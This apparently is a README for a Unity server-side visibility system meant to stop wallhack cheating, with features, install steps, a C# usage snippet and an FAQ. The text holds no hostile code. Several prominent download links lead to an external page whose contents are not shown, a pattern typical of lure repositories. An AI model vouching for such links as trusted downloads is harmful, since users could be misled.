# Anti-Wallhack Visibility System - Game Development Tool 2026

> A Unity server-side visibility detection solution built to stop wallhack abuse in multiplayer games, using authoritative occlusion checks to keep gameplay fair.

[![Platform](https://img.shields.io/badge/Platform-Unity-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/davisalex2006/visibility-system-anti-wallhack?style=flat-square)](https://github.com/davisalex2006/visibility-system-anti-wallhack)

---

<p align="center">
  <a href="https://davisalex2006.github.io/visibility-system-anti-wallhack/">
    <img src="https://img.shields.io/badge/Download-Anti--Wallhack%20Visibility%20System%20Latest-brightgreen?style=for-the-badge" alt="Download Anti-Wallhack Visibility System">
  </a>
</p>

> **[Direct Download - Anti-Wallhack Visibility System v1.0](https://davisalex2006.github.io/visibility-system-anti-wallhack/)**

---

[Download Latest Build](https://davisalex2006.github.io/visibility-system-anti-wallhack/)

---

## Overview

Anti-Wallhack Visibility System targets a major fairness problem in competitive multiplayer titles: wallhack exploits that let players spot enemies through walls and other solid surfaces. Instead of depending on client-reported visibility, this Unity asset moves the decision-making to the server, so only valid line-of-sight information is used. That gives developers a practical way to enforce fair play without bundling in intrusive anti-cheat tools or chasing frequent client-side updates.

It is intended for Unity projects that need a dependable, server-authoritative occlusion workflow. The system evaluates visibility with server-side raycasts, checking whether one player can actually see another based on the scene's colliders and blocking geometry. Because local rendering data on the client is never trusted to reveal hidden targets, it fits well in dedicated server setups and competitive game modes where trusted visibility matters.

## Features

- Server-side visibility checks driven by authoritative raycasts
- Stops wallhack abuse by ignoring client-side occlusion data
- Easy to drop into existing Unity multiplayer projects
- Works with standard Unity colliders and blocking geometry
- Adjustable detection distance and angle limits
- Handles multiple player visibility queries at the same time
- Uses only Unity's built-in physics system, with no extra dependencies
- Straightforward API for custom networking integrations

## Installation

Clone the repository or download the latest Unity package from the link above:

```bash
git clone https://github.com/davisalex2006/visibility-system-anti-wallhack.git
```

Import the `Anti-Wallhack-Visibility-System` folder into your Unity project's Assets directory. Make sure the project is running with a server-authoritative networking model so the system behaves correctly.

## Usage

Place the `VisibilityDetector` component on your server-side player controller or on a dedicated game manager. Then invoke `CheckVisibility` with the source and target transforms:

```csharp
VisibilityDetector detector = GetComponent<VisibilityDetector>();
bool canSee = detector.CheckVisibility(playerA.transform, playerB.transform);
```

If there is a clear line of sight between the two points, the method returns `true`. Use this test in damage, target selection, or similar gameplay logic so hidden opponents cannot be acted on.

## Configuration

All settings live in the `VisibilityDetector` inspector fields. The main options are:

- **Max Detection Distance**: The maximum range for visibility checks (default: 100 units)
- **Occlusion Layers**: Which layers to treat as blocking geometry (default: Default)
- **Debug Mode**: Enable visual raycast drawing in the Scene view for testing

Each instance can be configured separately, so different game modes or weapon types can use different detection behavior.

## Requirements

- Unity 2019.4 or later
- A server-authoritative multiplayer framework (e.g., Mirror, Netcode for GameObjects, Photon)
- Basic understanding of Unity's physics and raycasting systems
- No additional runtime dependencies beyond Unity's standard modules

## FAQ

**Q: Will this work with client-side prediction?**  
A: Yes, but visibility checks should still be executed on the server and used to validate client actions.

**Q: How frequently should visibility be evaluated?**  
A: For better performance, run checks only when they are needed, such as when a player tries to attack or target someone.

**Q: Can I define my own occlusion geometry?**  
A: Yes. Use the Occlusion Layers field to choose which colliders block visibility.

**Q: Does it depend on a specific Unity rendering pipeline?**  
A: No. The system relies on Unity's physics layer and is independent of the rendering pipeline.

**Q: Where can I request help?**  
A: Open an issue in the GitHub repository for bug reports or feature requests.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
